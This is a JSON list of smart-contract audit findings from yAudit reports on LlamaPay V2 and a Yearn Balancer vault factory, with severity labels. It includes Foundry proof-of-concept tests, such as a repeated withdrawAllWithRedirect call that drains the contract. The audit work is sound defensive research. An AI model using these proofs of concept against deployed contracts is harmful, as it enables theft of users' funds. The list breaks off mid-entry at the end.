[{"title": "1. Infinite withdrawals using function withdrawAllWithRedirect(uint256 _id)", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "In the following example, Bob can withdraw all tokens in the contract. The first call only withdraws the funds allocated to him, but because it's not recorded, Bob can call withdraw again. Here's an extended test. function testWithdrawAllWithRedirect() external { vm.prank(alice); llamaPayV2Payer.createStream( address(llamaToken), bob, 1e20, 10000, 10000000 ); vm.prank(bob); llamaPayV2Payer.addRedirectStream(0, steve); vm.warp(15000); vm.prank(bob); llamaPayV2Payer.withdrawAllWithRedirect(0); (uint256 balance, , , uint48 lastUpdate) = llamaPayV2Payer.tokens( address(llamaToken) ); assertEq(llamaToken.balanceOf(address(llamaPayV2Payer)), 5000 * 1e18); assertEq(llamaToken.balanceOf(steve), 5000 * 1e18); assertEq(balance, 5000 * 1e20); assertEq(lastUpdate, 15000); // redeemables should be 0 but it's not assertGt(llamaPayV2Payer.redeemables(0), 0); // Withdraw all again vm.prank(bob); llamaPayV2Payer.withdrawAllWithRedirect(0); assertEq(llamaToken.balanceOf(address(llamaPayV2Payer)), 0); assertEq(llamaToken.balanceOf(steve), 2 * 5000 * 1e18); assertEq(lastUpdate, 15000); // redeemables should be 0 but it's not assertGt(llamaPayV2Payer.redeemables(0), 0); }", "labels": ["yAudit", "Severity: Critical", "Difficulty: n/a"]}, {"title": "2. Inaccurate internal token balance for weird ERC20 tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "When a token is deposited into LlamaPayV2Payer, the internal balance is updated and the transfer of tokens into the contract happens. The key lines are: tokens[_token].balance += _amount * tokens[_token].divisor; token.safeTransferFrom(msg.sender, address(this), _amount); The problem is that if a fee-on-transfer exists, the tokens[_token].balance will be greater than the balanceOf token amount in the contract, because the tokens[_token].balance did not subtract the fee-on-transfer amount. A receiver could withdraw more tokens than they should have access to with these steps: The payer deposits X number of fee-on-transfer tokens into the LlamaPayV2Payer contract The internal balance thinks the contract holds X tokens, but actually the contract holds X - tokenFee tokens The contract accounting does not consider the fee involved for fee-on-transfer tokens. If the receiver is eligible to withdraw the X amount of tokens, they can only withdraw X - tokenFee tokens because this is the amount held by the contract. If fee-on-transfer tokens are permitted, the accounting should only permit a withdrawal of X - tokenFee. The payer deposits Y number of fee-on-transfer tokens into the LlamaPayV2Payer contract. If X - tokenFee + Y - tokenFee > X, then the receiver can now withdraw the X amount of tokens because the contract holds enough tokens to allow this withdrawal. If fee-on-transfer tokens are permitted, the accounting should only permit a withdrawal of X - tokenFee, but with the current code, the receiver with withdraw X tokens. Likewise, if a rebasing token is used and the balanceOf token amount in the contract is a function of time, the tokens[_token].balance value is not increased or decreased outside of deposit or withdraw events and therefore the internal accounting may underestimate the tokens held by the contract. This latter case could lock funds in the contract, for example: The payer deposits X number of rebasing tokens into the LlamaPayV2Payer contract Over time, the X rebasing tokens grow to 1.25 * X tokens Once the stream ends and the receiver can withdraw the full token balance, the internal account balance still assumes the contract holds only X tokens, so only X tokens and not 1.25 * X tokens can be withdrawn.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. burnStream() shouldn't burn a stream if it has some debt", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Alice creates a stream for Bob which ended but has some debt accrued. Some time after the stream ends, Alice decides to burn that stream. Later Bob checks that Alice has to pay some debt for stream and calls repayAllDebt() to pay the debt for that stream. But now as the stream has been burnt by Alice, Bob cannot redeem the debt from stream, and those amount of funds are locked into that stream.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "4. Payee funds get locked if stream is resumed after being burned", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Alice (payer) creates a stream for Bob (payee), and later Alice decided to burn the stream as the payout time was over. Now later Alice decides to resume the stream to Bob, which in turns makes the stream active again. But Bob can not accesss the redeemable funds as due to the burn the ownerOf(_id) is address(0), and has not been reallocated in resumeStream(). function testBurnAndResumeStream() external { vm.startPrank(alice); // Alice creates a stream for Bob llamaPayV2Payer.createStream( address(llamaToken), bob, 1e20, 10000, 50000 ); vm.warp(12000); // Alice stops the stream llamaPayV2Payer.stopStream(0, false); // Alice pays Bob llamaPayV2Payer.withdrawAll(0); // checking that bob is the owner of stream address nftOnwer = llamaPayV2Payer.ownerOf(0); assertEq(nftOnwer, bob); // Alice burns the stream llamaPayV2Payer.burnStream(0); // Alice resumes the stream, now Bob can again withdraw after some time llamaPayV2Payer.resumeStream(0); vm.warp(20000); vm.stopPrank(); // now Bob tries to withdraw from stream, which fails as the owner of nft is address(0) vm.startPrank(bob); llamaPayV2Payer.withdrawAll(0); vm.stopPrank(); }", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "5. Llama Pay V2 is incompatible with high decimal tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "The key line is: if (tokens[_token].divisor == 0) { tokens[_token].divisor = uint208(10**(20 - token.decimals())); } If token.decimals() is greater than 20, then the subtraction 20 - token.decimals() will underflow and the transaction will revert. This prevents depositing tokens like YAM-V2 into Llama Pay V2.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. permitToken fails in case of tokens that doesn't follow IERC20Permit standard", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "permitToken() fails in case of DAI. IERC20Permit: function permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external; DaiPermit: function permit( address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s ) external;", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "7. Handle funds transferred via transfer method", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Introduce a new variable X that tracks the net amount that exist in the contract for each token. Updating LlamaPayV2Payer.sol#L183 with ERC20(token_).balanceOf(address(this)) solves this by making those extra funds withdraw-able. - uint256 toSend = token.balance / token.divisor; + uint256 toSend = (token.balance / token.divisor) + (ERC20(_token).balanceOf(address(this)) - X); Rebalance token balance in _updateToken function. function _updateToken(address _token) private { Token storage token = tokens[_token]; token.balance += (ERC20(_token).balanceOf(address(this)) - X); ... }", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "8. Missing Input Validation", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "None of the external createStream functions or the internal one createStream perform input validation for the _to address. This address is supplied by the user and is the recipient of the stream token. It is not uncommon for users or front-ends/ clients to set 0 as values for input forms. This can lead to a user creating a stream but accidentally burning it in the process as well.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "9. _updateToken updates token.lastUpdate even if the token doesn't exists", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "function _updateToken(address _token) private { Token storage token = tokens[_token]; // @audit add this check require(token.divisor > 0, \"NOT_ADDED\"); // rest same }", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "10. BoringBatchable.batch() is payable", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "BoringBatchable.sol#L46", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "11. modifyStream() should revert for inactive stream", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "For example, take a stream s with id id with this configuration: s.lastPaid < s.starts lastUpdate > s.ends s.amountPerSec == _oldAmountPerSec Now, modifyStream(id, _newAmountPerSec, _newEnd) is called for this stream with _newEnd in future. After _updateStream(), lastPaid becomes 0, and now even though the stream's end is in future, it is not streamed any funds as the stream remains inactive.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "12. withdrawable() can revert", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Cases where withdrawable() can revert: When no token is deposited in LlamaPayV2Payer, and a stream is created. reverts due to division by 0 as token.divisor is 0. When execution reaches in this else block, and stream.starts > lastUpdate. reverts due to arithmetic underflow. This implicitly assumes that lastUpdate lies between starts and ends.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "13. Inaccuracies in withdrawable()", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "LlamaPayV2Payer.sol#L650 LlamaPayV2Payer.sol#L603", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "14. streams can be resumed even after burn", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "function testBurnAndResumeStream() external { vm.startPrank(alice); llamaPayV2Payer.createStream( address(llamaToken), bob, 1e20, 10000, 50000 ); vm.warp(12000); llamaPayV2Payer.stopStream(0, false); llamaPayV2Payer.withdrawAll(0); // burning the stream llamaPayV2Payer.burnStream(0); // resuming the stream llamaPayV2Payer.resumeStream(0); vm.stopPrank(); } function burnStream(uint256 _id) external { if ( msg.sender != owner && payerWhitelists[msg.sender] != 1 && msg.sender != ownerOf(_id) ) revert NOT_OWNER_OR_WHITELISTED(); /// Prevents somebody from burning an active stream or a stream with balance in it if (redeemables[_id] > 0 || streams[_id].lastPaid > 0) revert STREAM_ACTIVE_OR_REDEEMABLE(); _burn(_id); emit BurnStream(_id); } As above code shows that data related to that particular burnt _id still stays in contract, it can be again resumed.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "15. modifyStream can create a new stream if it doesn't exist", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Since modifyStream doesn't check whether the stream is present or not, it creates a new stream if not present. function testModifyStream() external { vm.prank(alice); llamaPayV2Payer.modifyStream(0, 2e20, 20000); (uint208 amountPerSec, , , , uint256 ends) = llamaPayV2Payer.streams( 0 ); assertEq(amountPerSec, 2e20); assertEq(ends, 20000); }", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "16. payerWhitelists addresses should have access to all withdraw operations", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "withdraw(), withdrawAll(), withdrawWithRedirect(), and withdrawAllWithRedirect() do not permit an address in payerWhitelists to call them. Most likely this was an oversight, because the addresses in payerWhitelists should have similar permissions as the contract owner. The payer whitelist addresses could take funds directly from the contract already, so they should be able to assist with transfering the funds to the intended recipient.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "17. Rogue payerWhitelists address can steal value", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Any function protected by the onlyOwnerAndWhitelisted modifier treats the owner and whitelisted payer addresses as the same privilege level. This includes the internal _createStream() function that can redirect value to a recipient. If an owner deposits value into the Llamapay contract, an address in the payerWhitelists mapping can: Backrun the deposit to create a stream where the recipient is an address that is controlled by the whitelisted address. The stream end date can be in the past so that it is possible to instantly withdraw. After the stream is created, the recipient can withdraw the funds. The end result is the same as calling withdrawPayer() directly, but this is a less expected approach.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "18. Use cheaper comparison", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "At L251 and L280 logic can be switched to save some gas.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "19. Incorrect function visibility", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "tokenURI() and withdrawable() should be external functions in LlamaPayV2Payer. In LlamaPayV2Factory, calculateLlamaPayAddress() should be an external function.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "20. owner should be a immutable variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "owner is never updated; it should be defined as an immutable to save gas.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "21. Return stream value after updating", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "If the _updateStream(uint256 _id) is changed to return the update stream, small gas optimization is possible. At L201, L222, L243, L272, L400, L425, L446, L222 a stream value could be returned instead of loading again stream in the next line.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "22. Use unchecked if no underflow risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Unchecked can be applied to this line and other similar locations. The subtraction will not overflow because lastUpdate is zero. block.timestamp - lastUpdate has a max value of type(uint48).max and token.totalPaidPerSec has a max value of type(uint208).max, the maximum product is type(uint256).max which doesn't overflow. - uint256 streamed = (block.timestamp - lastUpdate) * token.totalPaidPerSec; + unchecked { uint256 streamed = (block.timestamp - lastUpdate) * token.totalPaidPerSec; }", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "23. Do not load whole struct if not required", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Following function loads Stream struct, but loading Stream.token works. withdrawAllWithRedirect withdrawWithRedirect withdrawAll withdraw - Stream storage stream = streams[_id]; + address token = streams[_id].token;", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "24. Pass struct as a params to _createStream()", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Update _createStream and createStream this way: function createStream( address _token, address _to, uint208 _amountPerSec, uint48 _starts, uint48 _ends ) external { uint256 id = _createStream( Stream({ amountPerSec: _amountPerSec, token: _token, lastPaid: 0, starts: _starts, ends: _ends }), _to ); emit CreateStream(id, _token, _to, _amountPerSec, _starts, _ends); } function _createStream(Stream memory stream, address _to) private onlyOwnerAndWhitelisted returns (uint256 id) { if (stream.starts >= stream.ends) revert INVALID_TIME(); _updateToken(stream.token); Token storage token = tokens[stream.token]; if (block.timestamp > token.lastUpdate) revert PAYER_IN_DEBT(); _safeMint(_to, id = nextTokenId); /// calculate owed if stream already ended on creation uint256 owed; if (block.timestamp > stream.ends) { owed = (stream.ends - stream.starts) * stream.amountPerSec; } else if (block.timestamp > stream.starts) { /// calculated owed if start is before block.timestamp owed = (block.timestamp - stream.starts) * stream.amountPerSec; tokens[stream.token].totalPaidPerSec += stream.amountPerSec; stream.lastPaid = uint48(block.timestamp); } else if (stream.starts >= block.timestamp) { /// If started at timestamp or starts in the future tokens[stream.token].totalPaidPerSec += stream.amountPerSec; stream.lastPaid = uint48(block.timestamp); } unchecked { /// If can pay owed then directly send it to payee if (token.balance >= owed) { tokens[stream.token].balance -= owed; redeemables[id] = owed; } else { /// If cannot pay debt, then add to debt and send entire balance to payee uint256 balance = token.balance; tokens[stream.token].balance = 0; debts[id] = owed - balance; redeemables[id] = balance; } nextTokenId++; streams[id] = stream; } }", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "25. if condition can be optimized in withdrawable()", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "LlamaPayV2Payer.sol#L662", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "26. Use calldata instead of memory if function param remains unchanged", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Following function uses memory to pass string param, calldata can be used as the string remains unchanged during function execution. createStreamWithReason createStreamWithheldWithReason - string memory _reason + string calldata _reason", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "27. Consider and compare UX when streams are ERC1155 tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "ERC1155 doesn't have the same interface as ERC721, so if doing this replacement, a code refactor may be needed. Another thing to consider would be to use ERC1155D (see this repo and announcement) which provides compatibility with ERC721 interface, however, it's not audited. So if you consider ERC1155D, you can either self-review it, take inspiration or get it audited.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "28. Missing Indexed Event Parameters", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "All the events are missing any indexed parameters.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "29. External createStream functions should return the streamId", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Right now, the createStream functions namely createStream, createStreamWithReason, createStreamWithheld and createStreamWithheldWithReason, do not return the id of the newly created stream. Returning the id of the stream upon creation could result in better integration with other protocols and a better UX, where the user immediately knows the id of his stream once it is created.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "30. Update BoringBatchable to latest version", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "The difference between BoringBatchable in Llama Pay V2 and the main Boring Solidity repo is this PR https://github.com/boringcrypto/BoringSolidity/pull/16/files.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "31. Add tests for weird ERC20 tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "The weird-erc20 repo has many sample contracts that mimic unusual ERC20 token behavior. Consider writing tests to check the compatibility of LlamaPay V2 with all of these contracts.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "32. Sanitisation to avoid false event emission", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "function addPayerWhitelist(address _toAdd) external onlyOwner { require(payerWhitelists[_toAdd] == 0, \"ALREADY_WHITELISTED\"); payerWhitelists[_toAdd] = 1; emit AddPayerWhitelist(_toAdd); } function removePayerWhitelist(address _toRemove) external onlyOwner { require(payerWhitelists[_toAdd] == 1, \"NOT_WHITELISTED\"); payerWhitelists[_toRemove] = 0; emit RemovePayerWhitelist(_toRemove); }", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "33. tokenURI() should revert for non-existent tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "LlamaPayV2Payer.sol#L135", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "34. Missing events for critical operations", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Ideally, the following critical operations should trigger events: cancelDebt repayAllDebt repayDebt updateStream", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "35. Lack of zero check on functions", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "For e.x., function addPayerWhitelist(address _toAdd) external onlyOwner { payerWhitelists[_toAdd] = 1; emit AddPayerWhitelist(_toAdd); } Similarly following function doesn't check for valid input address. addPayerWhitelist removePayerWhitelist addRedirectStream addStreamWhitelist removeStreamWhitelist", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. onlyOwnerAndWhitelisted should be renamed onlyOwnerOrWhitelisted", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "LlamaPayV2Payer.sol#L129", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. unchecked has no effect", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "LlamaPayV2Payer.sol#L454", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Use consistent decimals format in functions", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "- /// @param _amount amount to repay (20 decimals) + /// @param _amount amount to repay (native token decimals) function repayDebt(uint256 _id, uint256 _amount) external { if ( msg.sender != owner && payerWhitelists[msg.sender] != 1 && msg.sender != ownerOf(_id) ) revert NOT_OWNER_OR_WHITELISTED(); address token = streams[_id].token; + /// convert _amount into 20 decimals format + _amount = _amount * tokens[token].divisor; /// Update token to update balances _updateToken(token); /// Reverts if debt cannot be paid tokens[token].balance -= _amount; /// Reverts if paying too much debt debts[_id] -= _amount; /// Add to redeemable to payee redeemables[_id] += _amount; }", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39. Use function to reduce duplicacy of code", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "if ( msg.sender != nftOwner && msg.sender != owner && streamWhitelists[_id][msg.sender] != 1 ) revert NOT_OWNER_OR_WHITELISTED(); Following code snippet can be converted into a function. function ownerOrNftOwnerOrWhitelisted(uint _id, address _nftOwner) internal { if ( msg.sender != nftOwner && msg.sender != owner && streamWhitelists[_id][msg.sender] != 1 ) revert NOT_OWNER_OR_WHITELISTED(); } Applicable to following functions: withdraw withdrawAll withdrawWithRedirect withdrawAllWithRedirect", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "40. Redirect recipient cannot receive funds directly", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "addRedirectStream() and removeRedirectStream() allow the receiver of the stream's tokens to sent to a different address with withdrawWithRedirect() or withdrawAllWithRedirect(). withdrawWithRedirect() and withdrawAllWithRedirect() have the same access controls as other withdraw functions, meaning only the NFT owner, the contract owner, or a stream whitelist address can trigger the transfer of funds to the redirect address. This means the redirect address does not have control over these funds but is instead relying on someone else to deliver the funds. This is a less than ideal experience for the redirect receiver, unless the intent of this feature is that the redirect address and NFT address should have the same person (or entity) owning the two addresses. If that is a hidden intent when using the redirect address, it should be clearly documented.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "41. Typos", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "strean -> stream redeeemable -> redeemable", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "42. Stream owner should be able to call updateStream()", "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md", "body": "LlamaPayV2Payer.sol#L478", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Dependency on a single DEX for CRV price", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "StrategyConvexFactoryClonable.sol#L430 estimates value of CRV tokens in terms of USDT by routing it through WETH swaps.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. Possible revert on creating a vault", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "BalancerGlobal.sol#L368-L375: bytes memory data = abi.encodeWithSignature(\"latestVault(address)\", lptoken); (bool success, ) = address(registry).staticcall(data); if (success) { return registry.latestVault(lptoken); } else { return registry.latestVault(lptoken, VaultType.AUTOMATED); } If no vault is registered for DEFAULT, success is false, and since there is no AUTOMATED type vault, the else clause revert. So in this case, it becomes impossible to create a vault for lptoken.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. Strategy migrations fail to claim reward/extraReward tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "There does not appear to be any mechanism to harvest or re-enable a strategy that has been migrated. This means that any unharvested rewards are effectively lost on migration. The magnitude of this finding depends on the amount of time that has passed since the strategy was last harvested. If the strategy has not been harvested in a week & is migrated, then a week's worth of extra rewards are lost. Given the following assumptions/observations, this finding may have a high impact: Some Curve vaults go unharvested for many weeks at a time. CRV/CVX/Extra rewards tend to make up a large fraction of yield revenue. There is no mechanism to prevent a strategy migration when a strategy has not been harvested in a long period of time. If the magnitude/accuracy of the above assumptions are incorrect, then this finding may have medium or lower severity.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "4. _loss on liquidatePosition() is never accounted in strategy & vault, which can result in funds lost/stuck", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "In BaseStrategy.sol, in harvest() we have this code debtOutstanding = vault.report(profit, loss, debtPayment); which reports the loss to the vault, so if it reports a 0 loss when there is one then the whole accounting logic for the strategy will be incorrect which can lead to loss funds or stuck funds in strategy. Also the correctness of the healthcheck in the strategy will not be certain because of the following code in BaseStrategy.sol that uses loss: require(HealthCheck(healthCheck).check(profit, loss, debtPayment, debtOutstanding, totalDebt), \"!healthcheck\");", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "5. Dependence on Curve/Balancer governance", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "Things move quick in this space and \"Curve wars\" bribing adds additional volatility to the situation. With this new automated process for adding pools/strategies, the risk from dependence on external governance processes is amplified. In the event of another governance attack or if a vulnerable token were to enter the system, then malicious actions could be completed more quickly now due to this new permissionless system dependent on approved gauges.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "6. Wrong parameter to cloneStrategyConvex function", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "The 3rd parameter in cloneStrategyConvex() is a _rewards address as defined in BalancerGlobal.sol#L83 interface IStrategy { function cloneStrategyConvex( address _vault, address _strategist, address _rewards, address _keeper, uint256 _pid, address _tradeFactory, uint256 _harvestProfitMax, address _booster, address _convexToken ) external returns (address newStrategy); However, the same management address was passed in for both 2nd and 3rd parameters: BalancerGlobal.sol#L479", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "7. Strategy migrations will cause inaccurate accounting on first harvest of new strategy", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "The impact of this finding is dependent on Yearn's strategy management practices & downstream tooling, so consider this impact analysis \"best effort\". If the old strategy has not been harvested in a long time, there may be a relatively large amount of unreported gains/losses that have yet to be realized by the old strategy. This may cause data accuracy problems when analyzing the APR performance for the new strategy. Consider the case where: Old strategy was last harvested a week ago. Old strategy is migrated to new strategy. 10 minutes later, the new strategy is harvested. In the above scenario, a week's worth of gains/losses will be realized by the new strategy, and since the new strategy was deployed 10 minutes prior, off-chain tooling/instrumentation might draw inaccurate conclusions about the performance of the new strategy.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "8. Convex's extraRewards array is unbounded", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "StrategyConvexFactoryClonable#_updateRewards has the following for loop: for (uint256 i; i < rewardsContract.extraRewardsLength(); i++) { address virtualRewardsPool = rewardsContract.extraRewards(i); address _rewardsToken = IConvexRewards(virtualRewardsPool).rewardToken(); // we only need to approve the new token and turn on rewards if the extra rewards isn't CVX if (_rewardsToken != address(convexToken)) { rewardsTokens.push(_rewardsToken); } } This basically loops over Convex's extra rewards. The problem is that adding extra rewards is not bounded in Convex link. This means that if there are too many extra rewards this function will run out of gas/go over the block gas limit and result in a DoS of core strategy functionality (updating rewards).", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "9. _loss incorrectly assumed even if rewards can be sold to cover loss", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "In BaseStrategy.sol, in withdraw() the _loss will be returned to the vault. The vault will then report this loss, suggesting the price per share is lower, despite the fact that the strategy could have even been in a profit if rewards were sold.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "10. Setting deposit limit twice", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "BalancerGlobal.sol#L463-L472 v.setDepositLimit(depositLimit) and Vault(vault).setDepositLimit(depositLimit) both set the deposit limit to the same value. The second call is not changing the deposit limit.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. External call on each loop iteration", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "StrategyConvexFactoryClonable.sol#L484 for (uint256 i; i < rewardsContract.extraRewardsLength(); i++) { Here at each iteration an external static call is made to fetch the array length. Developer Response Fixed.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Use of SafeMath for safe arithmetic", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "StrategyConvexFactoryClonable.sol#L343: _profit = assets.sub(debt); StrategyConvexFactoryClonable.sol#L361: _loss = debt.sub(assets); StrategyConvexFactoryClonable.sol#L565: Math.min(_stakedBal, _amountNeeded.sub(_wantBal)), In all these case, SafeMath can be avoided.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. Remove unused state variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "state variable numVaults in BalancerGlobal contract has been set once in createNewVaultsAndStrategies and have never been used any other function. There is an additional SSTORE operation each time we want to create a new vault.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "14. Use >0 for unsigned integers", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "!= 0 is a cheaper operation compared to >0, when dealing with uint. >0 can be replaced with != 0 for gas optimization. The >0 has been used in many places in BalancerGlobal and StrategyConvexFactoryClonable contract such as here and here.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "15. Storage variable numVaults in BalancerGlobal is not needed", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "The variable is set only once in numVaults = deployedVaults.length;. There is no need to use a separate storage slot for this value, you can just add a getter method for 